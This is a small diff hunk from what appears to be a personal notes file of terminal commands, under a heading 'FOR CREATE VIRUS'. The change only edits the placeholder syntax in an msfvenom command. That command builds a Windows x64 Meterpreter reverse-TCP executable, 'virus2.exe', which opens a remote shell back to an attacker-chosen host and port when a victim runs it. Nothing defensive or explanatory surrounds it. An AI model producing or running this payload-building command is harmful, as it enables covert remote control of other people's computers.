@@ -9,7 +9,7 @@ TERMINAL COMMANDS
 
 FOR CREATE VIRUS:
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<local ip> lport=<port> -a x64 --platform windows -f exe -o virus2.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=local ip lport=port -a x64 --platform windows -f exe -o virus2.exe
 
 //////////////////////////
 
